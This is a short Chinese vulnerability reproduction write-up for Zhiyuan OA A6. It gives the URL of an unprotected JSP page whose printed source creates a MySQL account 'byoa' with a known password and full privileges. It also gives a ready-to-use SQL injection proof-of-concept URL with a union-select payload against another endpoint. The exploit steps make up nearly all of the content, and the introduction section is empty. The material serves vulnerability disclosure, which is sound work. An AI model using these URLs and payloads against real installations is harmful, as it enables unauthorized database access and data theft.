致远OA A6 重置数据库账号密码漏洞
================================

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

### 重置数据库账号密码防御

    http://www.0-sec.org/yyoa/ext/byoa/start.jsp

该文件的代码为：

    <%    Connection conn = null;    PreparedStatement pstmt = null;    String sql = "create user byoa IDENTIFIED by 'byoa'";    try {        conn = null;//net.btdz.oa.common.ConnectionPoolBean.getConnection();        pstmt = conn.prepareStatement(sql);        out.print(pstmt.executeUpdate());        sql = "grant all on *.* to byoa";        pstmt = conn.prepareStatement(sql);        out.println(pstmt.executeUpdate());        pstmt.close();        sql = "update mysql.user set password=password('byoa') where user='byoa'";        pstmt = conn.prepareStatement(sql);        out.println(pstmt.executeUpdate());        pstmt.close();        sql = "flush privileges";        pstmt = conn.prepareStatement(sql);        out.print(pstmt.executeUpdate());        pstmt.close();        //conn.close();    } catch (Exception ex) {                    out.println(ex.getMessage());    }%>

可以抛光该文件没有验证任何权限，便进行了重置数据库用户byoa的密码为：byoa

### mysql + jsp注射

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp

### poc

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select user()%23{'success':false,'errors':'root@localhost'
